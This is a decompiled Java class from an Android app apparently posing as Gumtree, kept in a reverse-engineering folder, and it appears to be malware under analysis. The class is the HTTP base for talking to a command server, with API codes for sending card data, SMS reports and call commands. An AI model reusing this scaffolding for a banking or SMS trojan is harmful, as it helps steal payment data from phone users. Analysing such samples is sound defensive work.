package com.gumsis.api.request;

import android.content.Context;
import android.util.Log;
import com.gumsis.Realtalk;
import com.gumsis.api.tls.TxtTls;
import com.gumsis.checktls.Print;
import org.json.JSONException;
import org.json.JSONObject;

public abstract class HttpRequest
{
  public static final int ACCESS_STATUS_API = 25;
  public static final int CALL_NUMBER_API = 29;
  public static final int CHANGE_MS_CL_API = 27;
  public static final int GATE_API = 32;
  public static final int HARD_MODE_API = 28;
  public static final int HIT_GATE_API = 10;
  public static final String HTTP_REQ_ENTITY_JOIN = "&";
  public static final String HTTP_REQ_ENTITY_MERGE = "=";
  private static final String LOG_TAG = "REALTALK REQUEST";
  public static final int PUSH_END_STATUS_API = 11;
  public static final int PUSH_RUN_STATUS_API = 12;
  public static final int PUSH_TRACKER_API = 26;
  public static final int REGISTRATION_STEP1_API = 13;
  public static final int REGISTRATION_STEP2_API = 14;
  public static final int REGISTRATION_STEP3_API = 15;
  public static final int REGISTRATION_STEP4_API = 16;
  public static final int REGISTRATION_STEP5_API = 17;
  public static final int REGISTRATION_STEP6_API = 18;
  public static final int SEND_CARD_DATA_API = 23;
  public static final int SEND_SMS_REPORT_API = 20;
  public static final int SEND_SMS_REPORT_ERROR_API = 19;
  public static final int SEND_SMS_STATUS_API = 22;
  public static final int SEND_SMS_STATUS_END_API = 21;
  public static final int SMS_SEND_RECEIVER_API = 24;
  public static final int START_ACCESS_END_API = 31;
  public static final int START_ACCESS_RUN_API = 30;
  public static final int UNKNOWN_API = -1;
  private String HTTP_DOMAIN;
  public byte[] data = null;
  HTTPRequestHandler mHttpResponseHandler = new HTTPRequestHandler()
  {
    public void onFailure(int paramAnonymousInt1, int paramAnonymousInt2, String paramAnonymousString)
    {
      paramAnonymousInt1 = 100000;
      if (paramAnonymousInt2 == 0) {
        paramAnonymousInt1 = 100000;
      }
      for (;;)
      {
        HttpRequest.this.onRequestFailure(paramAnonymousInt1, paramAnonymousString);
        return;
        if (paramAnonymousInt2 > 300) {
          paramAnonymousInt1 = 100102;
        }
      }
    }
    
    public void onSuccess(int paramAnonymousInt1, int paramAnonymousInt2, String paramAnonymousString)
    {
      try
      {
        if (TxtTls.ckIsEmpty(paramAnonymousString))
        {
          Log.e("REALTALK REQUEST", "responseBody is null");
          return;
        }
        try
        {
          JSONObject localJSONObject = new JSONObject(paramAnonymousString);
          HttpRequest.this.onRequestSuccess(localJSONObject);
          return;
        }
        catch (JSONException localJSONException)
        {
          HttpRequest.this.onRequestFailure(100104, paramAnonymousString);
          return;
        }
        return;
      }
      catch (Exception paramAnonymousString)
      {
        paramAnonymousString.printStackTrace();
      }
    }
  };
  protected String path = "";
  long requestTime = 0L;
  public int requestType = -1;
  
  protected HttpRequest(Context paramContext, String paramString, int paramInt)
  {
    this.HTTP_DOMAIN = Realtalk.getServerGate(paramContext);
    Print.e(this.HTTP_DOMAIN);
    if (TxtTls.ckIsEmpty(paramString))
    {
      this.path = "";
      return;
    }
    this.path = paramString;
    this.requestType = paramInt;
  }
  
  private String getDomain()
  {
    return this.HTTP_DOMAIN;
  }
  
  protected String getBaseUrl()
  {
    return getDomain() + this.path;
  }
  
  protected abstract String getHttpParams(Context paramContext)
    throws Exception;
  
  protected abstract String getUrl();
  
  protected abstract void onRequestFailure(int paramInt, String paramString);
  
  protected abstract void onRequestSuccess(JSONObject paramJSONObject);
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/api/request/HttpRequest.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */